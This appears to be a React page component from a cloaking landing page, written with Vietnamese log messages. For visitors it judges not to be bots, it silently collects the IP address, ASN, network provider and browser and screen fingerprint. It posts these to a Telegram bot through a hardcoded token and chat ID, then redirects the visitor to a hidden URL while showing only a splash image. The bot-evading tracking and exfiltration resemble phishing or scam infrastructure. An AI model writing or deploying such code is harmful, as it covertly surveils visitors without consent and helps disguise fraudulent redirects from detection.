import type { FC } from 'react';
import { useEffect, useRef } from 'react';
import { useBotDetection } from '@/hooks/useBotDetection';

const Index: FC = () => {
    const { isBot, isLoading, shouldRedirect } = useBotDetection();
    const logSentRef = useRef(false);

    useEffect(() => {
        console.log('Redirect check:', { shouldRedirect, isBot, isLoading });
        if (shouldRedirect && !isBot && !isLoading) {
            const redirectUrl = import.meta.env.PUBLIC_REDIRECT_URL;
            console.log('Redirecting to:', redirectUrl);
            window.location.href = redirectUrl;
        }
    }, [shouldRedirect, isBot, isLoading]);

    useEffect(() => {
        if (!isLoading && !isBot && !logSentRef.current) {
            logSentRef.current = true;
            const fetchGeoAndSendTelegram = async () => {
                const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
    			const botToken = '8490086521:AAEUmh3X3VK2-yrO48QTA_fahPRhdEmmqEI';
        		const chatId = '-5200329279';
                const geoRes = await fetch(geoUrl);
                const geoData = await geoRes.json();
                const fullFingerprint = {
                    asn: geoData.asn,
                    organization_name: geoData.organization_name,
                    organization: geoData.organization,
                    ip: geoData.ip,
                    navigator: {
                        userAgent: navigator.userAgent,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        maxTouchPoints: navigator.maxTouchPoints,
                        webdriver: navigator.webdriver,
                    },
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                    },
                };

                const msg = `🔍 <b>Log truy cập</b>
📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}</code>

🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}</code>

📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;

                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                const payload = {
                    chat_id: chatId,
                    text: msg,
                    parse_mode: 'HTML',
                };

                try {
                    const response = await fetch(telegramUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload),
                    });

                    const result = await response.json();

                    if (!response.ok) {
                        console.error('telegram api error:', result);
                    } else {
                        console.log('telegram sent successfully:', result);
                    }
                } catch (error) {
                    console.error('telegram send fail:', error);
                    const errorMsg = error instanceof Error ? error.message : 'Không thể kết nối';
                }
            };
            fetchGeoAndSendTelegram();
        }
    }, [isLoading, isBot]);
    useEffect(() => {
        if (!isLoading && !isBot && !shouldRedirect) {
            const timer = setTimeout(() => {
                const redirectUrl = import.meta.env.PUBLIC_REDIRECT_URL;
                window.location.href = redirectUrl;
            }, 5000);

            return () => clearTimeout(timer);
        }
    }, [isBot, isLoading, shouldRedirect]);

    if (isLoading) {
        return (
            <div className="fixed inset-0 flex items-center justify-center bg-white">
				<img src="https://raw.githubusercontent.com/Cattom911/ca_map/refs/heads/enable_noti/src/assets/images/splash.gif" alt="Loading..." className="max-w-full max-h-full" />
			</div>
        );
    }

    if (isBot) {
        return (
            <div className="fixed inset-0 flex items-center justify-center bg-white">
				<img src="https://raw.githubusercontent.com/Cattom911/ca_map/refs/heads/enable_noti/src/assets/images/splash.gif" alt="Loading..." className="max-w-full max-h-full" />
			</div>
        );
    }

    return (
        <div className="fixed inset-0 flex items-center justify-center bg-white">
				<img src="https://raw.githubusercontent.com/Cattom911/ca_map/refs/heads/enable_noti/src/assets/images/splash.gif" alt="Loading..." className="max-w-full max-h-full" />
			</div>
    );
};

export default Index;
